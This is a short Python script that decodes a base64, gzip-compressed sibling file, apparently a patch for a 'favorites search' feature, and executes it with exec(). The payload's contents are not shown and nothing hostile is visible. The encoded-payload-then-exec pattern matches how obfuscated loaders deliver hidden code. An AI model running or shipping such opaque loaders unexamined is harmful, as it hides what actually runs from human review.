#!/usr/bin/env python3
from pathlib import Path
import base64
import gzip

payload = Path(__file__).with_name("patch_stage441_favorites_search.py.gz.b64")
source = gzip.decompress(base64.b64decode(payload.read_text(encoding="ascii"))).decode("utf-8")
code = compile(source, str(payload.with_suffix("")), "exec")
scope = {"__name__": "__main__", "__file__": str(payload.with_suffix(""))}
exec(code, scope, scope)
